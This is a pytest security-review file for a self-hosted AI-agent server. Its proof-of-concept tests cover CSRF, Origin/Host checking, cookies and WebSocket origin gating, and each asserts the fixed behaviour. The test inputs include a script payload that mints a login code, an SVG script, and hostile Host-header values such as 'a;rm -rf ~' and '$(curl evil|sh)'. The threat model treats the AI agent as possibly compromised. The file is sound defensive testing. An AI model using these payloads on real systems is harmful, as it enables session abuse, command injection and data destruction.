"""SR4 adversarial review — CSRF / cookies / Origin / Host on the paste-code
device login and the LAN-first origin logic.

The test_poc_* tests began as PoCs asserting the exploitable behaviour; the
fixer (SF) inverted each one to assert the fixed behaviour, keeping the name
so the finding stays traceable. test_neg_* are attacks that were tried and are
refused.

Threat model assumed throughout: the operator's browser holds a `jarvis_token`
cookie for the LAN server (http, cookie_secure off), and the agent may be
compromised (it can write project files — CLAUDE.md's stated assumption).
"""
import base64

import httpx
import pytest
from starlette.testclient import TestClient

from backend import auth, devices_api, guest_shell, lan, pastelogin
from backend.auth import COOKIE_NAME, hash_password, make_token, require_same_origin
from backend.config import settings
from backend.db import get_db, init_db
from backend.main import app

HOST = "jav3.lan:8000"
BASE = f"http://{HOST}"
SELF = f"http://{HOST}"
MINT = "/api/devices/login-code"
REDEEM = "/api/devices/login"


@pytest.fixture(autouse=True)
def _reset():
    pastelogin.reset_for_tests()
    yield
    pastelogin.reset_for_tests()


@pytest.fixture
def fake_lan(monkeypatch):
    monkeypatch.setattr(lan, "lan_ips", lambda: ["192.168.5.20"])
    monkeypatch.setattr(lan.socket, "gethostname", lambda: "boxy")
    monkeypatch.setattr(lan, "_own", None)
    monkeypatch.setitem(lan._state, "hostname", "jav3.local")
    yield
    lan._own = None


@pytest.fixture
async def op(tmp_env):
    """(operator client with a session cookie, cookieless client)."""
    await init_db()
    db = await get_db()
    try:
        await db.execute("INSERT INTO users (username, password_hash) VALUES (?, ?)",
                         ("operator", hash_password("hunter2")))
        await db.commit()
    finally:
        await db.close()
    t = httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(transport=t, base_url=BASE) as c, \
               httpx.AsyncClient(transport=t, base_url=BASE) as anon:
        r = await c.post("/api/auth/login",
                         json={"username": "operator", "password": "hunter2"})
        assert r.status_code == 200
        yield c, anon


async def _project_with_file(c, rel: str, content: str) -> str:
    """A project containing an agent-authored file. PUT /file is the operator
    route; the agent reaches the same bytes through writes.apply_write."""
    r = await c.post("/api/projects", json={"name": "demo"})
    assert r.status_code == 200, r.text
    slug = r.json()["slug"]
    r = await c.put(f"/api/projects/{slug}/file", json={"path": rel, "content": content})
    assert r.status_code == 200, r.text
    return slug


# =============================================================================
# F1 (HIGH) — agent-authored HTML/SVG is served as live same-origin content
# =============================================================================

XSS = "<script>fetch('/api/devices/login-code',{method:'POST'})</script>"


async def test_poc_raw_serves_agent_html_as_active_same_origin_page(op):
    """FIXED: `raw` serves agent-written files inert — every type gets
    `CSP: sandbox` (opaque origin: no cookie reach even if rendered) and
    nosniff; html/svg/xml are forced to download as octet-stream. Previewing
    HTML is the Workspace's sandboxed srcDoc iframe, not this URL."""
    c, _ = op
    slug = await _project_with_file(c, "code/report.html", XSS)
    r = await c.get(f"/api/projects/{slug}/raw/code/report.html")
    assert r.status_code == 200
    assert r.headers["content-type"] == "application/octet-stream"
    assert "sandbox" in r.headers.get("content-security-policy", "")
    assert r.headers.get("content-disposition", "").startswith("attachment")
    assert r.headers.get("x-content-type-options") == "nosniff"

    await c.put(f"/api/projects/{slug}/file", json={
        "path": "code/plot.svg",
        "content": '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'})
    r = await c.get(f"/api/projects/{slug}/raw/code/plot.svg")
    assert r.headers["content-type"] == "application/octet-stream"
    assert r.headers.get("content-disposition", "").startswith("attachment")
    # a passive type stays inline (images in <img>) but still sandboxed+nosniff
    await c.put(f"/api/projects/{slug}/file", json={"path": "code/n.txt",
                                                    "content": XSS})
    r = await c.get(f"/api/projects/{slug}/raw/code/n.txt")
    assert r.headers["content-type"].startswith("text/plain")
    assert "attachment" not in r.headers.get("content-disposition", "")
    assert "sandbox" in r.headers["content-security-policy"]
    assert r.headers["x-content-type-options"] == "nosniff"


async def test_poc_same_origin_page_mints_reads_and_redeems_a_login_code(op):
    """FIXED at the source (F1): an agent file can no longer BE a same-origin
    page. A document served with `CSP: sandbox` runs in an opaque origin, so
    its fetches carry `Origin: null` — which the global gate refuses on every
    cookie-carrying state change."""
    c, _ = op
    r = await c.post(MINT, json={}, headers={"Origin": "null"})
    assert r.status_code == 403
    r = await c.post(MINT, json={}, headers={"Origin": SELF})
    assert r.status_code == 200          # the real Settings page still works


async def test_poc_same_origin_page_runs_code_on_the_host(op, tmp_env):
    """FIXED (containment): the host runner stays (the operator's call), but a
    sandboxed page's `Origin: null` and any other origin are refused before it
    runs, and every run that does happen is a `host_run` security event."""
    c, _ = op
    slug = await _project_with_file(c, "code/x.txt", "x")
    marker = tmp_env / "host-side-effect"
    for origin in ("null", "http://jav3.lan:9999", "http://evil.example"):
        r = await c.post(f"/api/projects/{slug}/run", headers={"Origin": origin},
                         json={"code": f"open({str(marker)!r},'w').write('pwned')"})
        assert r.status_code == 403, origin
    assert not marker.exists()
    r = await c.post(f"/api/projects/{slug}/run", headers={"Origin": SELF},
                     json={"code": "print('hi')"})
    assert r.status_code == 200, r.text
    db = await get_db()
    try:
        async with db.execute("SELECT project_slug, detail FROM security_events "
                              "WHERE kind = 'host_run'") as cur:
            rows = await cur.fetchall()
    finally:
        await db.close()
    assert len(rows) == 1 and rows[0][0] == slug and "code/scratch.py" in rows[0][1]


# =============================================================================
# F2 (MEDIUM) — require_same_origin covers 7 routes; ~80 cookie routes lack it
# =============================================================================

async def test_poc_csrf_guard_missing_on_sensitive_cookie_routes(op):
    """FIXED: the check is global (auth.SameOriginMiddleware), not a per-route
    opt-in — so there is no per-route list left to forget a route from. Every
    cookie-carrying POST/PUT/PATCH/DELETE route is refused from a foreign
    origin before its handler (or its auth) runs."""
    from backend.auth import SameOriginMiddleware
    assert any(m.cls is SameOriginMiddleware for m in app.user_middleware)
    c, _ = op
    for method, path in [("POST", "/api/projects/demo/run"),
                         ("PUT", "/api/secrets/X"),
                         ("POST", "/api/egress/pending/1/approve"),
                         ("POST", "/api/egress/grants/demo"),
                         ("POST", "/api/projects/demo/git/requests/1/approve"),
                         ("POST", "/api/memory/notes/n/promote"),
                         ("POST", "/api/projects/demo/upload"),
                         ("POST", "/api/chat"),
                         ("PUT", "/api/model"),
                         ("DELETE", "/api/devices/1"),
                         ("PATCH", "/api/conversations/1")]:
        r = await c.request(method, path, json={},
                            headers={"Origin": "http://jav3.lan:9999"})
        assert r.status_code == 403, (method, path, r.status_code)


@pytest.mark.parametrize("origin", ["http://jav3.lan:9999", "http://evil.example"])
async def test_poc_bodyless_posts_accept_a_foreign_origin(op, origin):
    """FIXED: body-less, form-submittable POSTs from a foreign origin (another
    port on the same host is same-SITE, so Lax sends the cookie) are 403."""
    c, _ = op
    form = {"Origin": origin, "Content-Type": "application/x-www-form-urlencoded"}
    for path in ["/api/security/events/ack_all",
                 "/api/egress/pending/999/approve",
                 "/api/projects/nope/git/requests/1/approve",
                 "/api/memory/notes/nope/promote",
                 "/api/schedules/999/run-now"]:
        r = await c.post(path, headers=form)
        assert r.status_code == 403, (path, r.status_code)
    # the same POST from the app's own origin still goes through
    r = await c.post("/api/security/events/ack_all",
                     headers={**form, "Origin": SELF})
    assert r.status_code == 200


async def test_poc_multipart_upload_accepts_a_foreign_origin(op):
    """FIXED: a multipart form upload from a foreign origin is 403."""
    c, _ = op
    slug = await _project_with_file(c, "code/x.txt", "x")
    r = await c.post(f"/api/projects/{slug}/upload",
                     headers={"Origin": "http://evil.example"},
                     files={"file": ("planted.html", XSS.encode(), "text/html")})
    assert r.status_code == 403, r.text
    r = await c.get(f"/api/projects/{slug}/files")
    assert "planted.html" not in r.text


# =============================================================================
# F3 (MEDIUM, defense-in-depth) — the Origin check compares hostnames only
# =============================================================================

async def test_poc_origin_check_ignores_port(op):
    """FIXED: scheme + host + port are all compared."""
    c, _ = op
    for o in ["http://jav3.lan:1", "https://jav3.lan:65535", "https://jav3.lan:8000",
              "http://jav3.lan"]:
        r = await c.post(MINT, json={}, headers={"Origin": o})
        assert r.status_code == 403, o
    r = await c.post(MINT, json={}, headers={"Origin": "http://jav3.lan:8000"})
    assert r.status_code == 200


async def test_poc_auto_allowed_lan_names_pass_on_any_port(op, fake_lan):
    """FIXED: the server's own LAN names are accepted only on its own port."""
    c, _ = op
    for o in ["http://boxy:31337", "http://boxy.local:1", "http://jav3.local:2",
              "http://192.168.5.20:8080"]:
        r = await c.post(MINT, json={}, headers={"Origin": o})
        assert r.status_code == 403, o
    port = settings.lan_port
    for o in [f"http://boxy:{port}", f"http://jav3.local:{port}",
              f"http://192.168.5.20:{port}"]:
        r = await c.post(MINT, json={}, headers={"Origin": o})
        assert r.status_code == 200, o


async def test_neg_login_code_cannot_be_minted_by_a_simple_request(op):
    """What actually stops a cross-port CSRF on login-code is NOT the Origin
    check but FastAPI's strict JSON content type (0.139 strict_content_type):
    every CORS-simple content type and a missing Content-Type are 422, so a
    cross-origin JSON POST needs a preflight, and nothing answers CORS
    (no CORSMiddleware, no Access-Control-* anywhere). Fragile: if CodeBody
    ever becomes optional, the endpoint turns form-mintable and F3 is the
    only guard left."""
    c, _ = op
    for ct in [None, "text/plain", "application/x-www-form-urlencoded",
               "multipart/form-data; boundary=x"]:
        for origin, want in (("http://jav3.lan:9999", 403),   # global gate, first
                             (SELF, 422)):                   # strict JSON, behind it
            req = c.build_request("POST", MINT, content=b"{}",
                                  headers={"Origin": origin})
            if ct is None:
                req.headers.pop("content-type", None)
            else:
                req.headers["content-type"] = ct
            assert (await c.send(req)).status_code == want, (ct, origin)
    r = await c.options(MINT, headers={"Origin": "http://jav3.lan:9999",
                                       "Access-Control-Request-Method": "POST"})
    assert not any(k.lower().startswith("access-control-") for k in r.headers)


async def test_neg_origin_null_and_foreign_refused(op):
    c, _ = op
    for o in ["null", "http://evil.example", "http://jav3.lan.evil.example",
              "http://evil.example#@jav3.lan", "file://"]:
        r = await c.post(MINT, json={}, headers={"Origin": o})
        assert r.status_code == 403, o


async def test_poc_missing_origin_with_a_cookie_is_allowed_and_referer_ignored(op):
    """FIXED: with no Origin, a foreign Referer (or Sec-Fetch-Site saying
    cross-/same-site) is refused. No Origin and no Referer stays allowed —
    that is curl/the CLI, which carry no ambient cookie."""
    c, _ = op
    r = await c.post(MINT, json={}, headers={"Referer": "http://evil.example/x"})
    assert r.status_code == 403
    r = await c.post(MINT, json={}, headers={"Sec-Fetch-Site": "same-site"})
    assert r.status_code == 403
    r = await c.post(MINT, json={}, headers={"Referer": f"{SELF}/settings"})
    assert r.status_code == 200
    r = await c.post(MINT, json={})
    assert r.status_code == 200


def test_poc_ipv6_host_breaks_the_same_origin_check():
    """FIXED: a bracketed IPv6 Host is parsed properly — same-origin passes,
    another port on the same address does not."""
    from fastapi import HTTPException
    from starlette.requests import Request

    def req(origin):
        return Request({"type": "http", "headers": [
            (b"origin", origin), (b"host", b"[fd00::5]:8000")]})
    require_same_origin(req(b"http://[fd00::5]:8000"))
    with pytest.raises(HTTPException):
        require_same_origin(req(b"http://[fd00::5]:8001"))


# =============================================================================
# F4 (LOW) — Host header -> address= / install.sh
# =============================================================================

@pytest.mark.parametrize("host", ["127.1:8000", "0x7f000001:8000", "2130706433:8000",
                                  "a..b:8000", "x:00080"])
async def test_poc_loopback_aliases_and_odd_names_are_echoed_as_address(op, host, monkeypatch):
    """FIXED: short/hex/decimal IPv4 forms, empty labels and zero-padded ports
    are refused as a Host, so the LAN address is handed out instead."""
    c, _ = op
    monkeypatch.setattr(devices_api.lan, "lan_ips", lambda: ["10.0.0.9"])
    monkeypatch.setattr(devices_api.lan, "advertised_hostname", lambda: "")
    r = await c.post(MINT, json={}, headers={"Host": host})
    assert r.json()["address"] == "10.0.0.9:8000"


@pytest.mark.parametrize("host", ["x code=evil", "a@b:8000", "evil.example.:80",
                                  "jäv3.lan:8000", "x:0", "x:65536", "$(id)", "`id`",
                                  'a"b', "a b", "[fe80::1%eth0]:8000", "-a.b",
                                  "localhost:8000\r\nX: y"])
async def test_neg_hostile_host_headers_are_not_echoed(op, host, monkeypatch):
    c, _ = op
    monkeypatch.setattr(devices_api.lan, "lan_ips", lambda: ["10.0.0.9"])
    monkeypatch.setattr(devices_api.lan, "advertised_hostname", lambda: "")
    assert devices_api._host_header(type("R", (), {"headers": {"host": host}})()) is None


async def test_neg_rebinding_host_gets_no_cookie_and_cannot_mint(op):
    """DNS rebinding: evil.example re-resolves to the server. Origin == Host ==
    evil.example so require_same_origin PASSES (it trusts Host, and there is no
    Host allowlist / TrustedHostMiddleware) — but the cookie is host-only for
    the real name, so the browser sends none and every cookie route is 401."""
    _, anon = op
    r = await anon.post(MINT, json={}, headers={"Host": "evil.example:8000",
                                               "Origin": "http://evil.example:8000"})
    assert r.status_code == 401


async def test_poc_rebinding_reaches_unauthenticated_routes(op):
    """PARTLY FIXED: a rebinding page can still spend the operator machine's
    miss budget, but a valid code now always redeems, so that buys nothing.
    install.sh still reflects any well-formed Host (residual: the page cannot
    read it cross-origin, and a same-origin rebinding page gets no cookie)."""
    _, anon = op
    r = await anon.get("/cli/install.sh", headers={"Host": "evil.example:8000"})
    assert r.status_code == 200 and 'BASE="http://evil.example:8000"' in r.text
    h = {"Host": "evil.example:8000", "Origin": "http://evil.example:8000"}
    for _ in range(pastelogin._WRONG_PER_PEER):
        await anon.post(REDEEM, json={"code": "A" * 43}, headers=h)
    assert (await anon.post(REDEEM, json={"code": "A" * 43}, headers=h)).status_code == 429
    code, _t = pastelogin.mint("legit", by="operator")
    r = await anon.post(REDEEM, json={"code": code})          # the real CLI, same peer
    assert r.status_code == 200


@pytest.mark.parametrize("host", ["a;rm -rf ~", "$(curl evil|sh)", "a`id`", 'a"b',
                                  "a\\b", "a'b"])
async def test_neg_install_sh_host_cannot_inject_shell(op, host):
    _, anon = op
    r = await anon.get("/cli/install.sh", headers={"Host": host})
    assert r.status_code == 400


# =============================================================================
# F5 — cookie attributes and WebSockets
# =============================================================================

async def test_neg_session_cookie_is_httponly_lax_hostonly(tmp_env):
    await init_db()
    db = await get_db()
    try:
        await db.execute("INSERT INTO users (username, password_hash) VALUES (?, ?)",
                         ("operator", hash_password("pw")))
        await db.commit()
    finally:
        await db.close()
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url=BASE) as c:
        r = await c.post("/api/auth/login", json={"username": "operator", "password": "pw"})
    sc = r.headers["set-cookie"].lower()
    assert "httponly" in sc and "samesite=lax" in sc and "path=/" in sc
    assert "domain=" not in sc                 # host-only
    assert "secure" not in sc                  # LAN default: cleartext on the wire
    assert settings.cookie_secure is False


def test_poc_guest_shell_websocket_has_no_origin_check(tmp_env, monkeypatch):
    """FIXED: WebSocket handshakes carrying the cookie go through the same
    global origin gate — a foreign origin is closed before the handler runs."""
    from starlette.websockets import WebSocketDisconnect

    async def fake_session(recv, send, slug):
        await send("shell-open")
    monkeypatch.setattr(guest_shell, "_session", fake_session)
    tok = make_token(1, "operator")
    tc = TestClient(app, base_url=BASE)          # no `with`: skip the lifespan (VM, mDNS)
    tc.cookies.set(COOKIE_NAME, tok)
    for origin in ("http://evil.example", "http://jav3.lan:9999"):
        with pytest.raises(WebSocketDisconnect):
            with tc.websocket_connect("/api/guest/shell",
                                      headers={"Origin": origin}) as ws:
                ws.receive_text()
    # TestClient's WS handshake always sends Host: testserver
    with tc.websocket_connect("/api/guest/shell",
                              headers={"Origin": "http://testserver"}) as ws:
        assert ws.receive_text() == "shell-open"


# =============================================================================
# Out of angle, found while here
# =============================================================================

async def test_poc_git_basic_auth_bypasses_the_login_throttle(op, monkeypatch):
    """FIXED: git Basic auth goes through auth.check_password_login — the same
    per-username counter, growing delay and login_failed alert as the GUI."""
    _, anon = op
    auth._failures.clear()
    slept = []

    async def no_sleep(s):
        slept.append(s)
    monkeypatch.setattr(auth.asyncio, "sleep", no_sleep)
    bad = base64.b64encode(b"operator:wrong").decode()
    for _ in range(6):
        r = await anon.get("/git/demo/info/refs?service=git-upload-pack",
                           headers={"Authorization": f"Basic {bad}"})
        assert r.status_code == 401
    assert auth._failures["operator"][0] == 6
    assert slept and max(slept) > 0
    db = await get_db()
    try:
        async with db.execute("SELECT detail FROM security_events "
                              "WHERE kind = 'login_failed'") as cur:
            rows = await cur.fetchall()
    finally:
        await db.close()
    assert rows and '"via": "git"' in rows[0][0]
    auth._failures.clear()
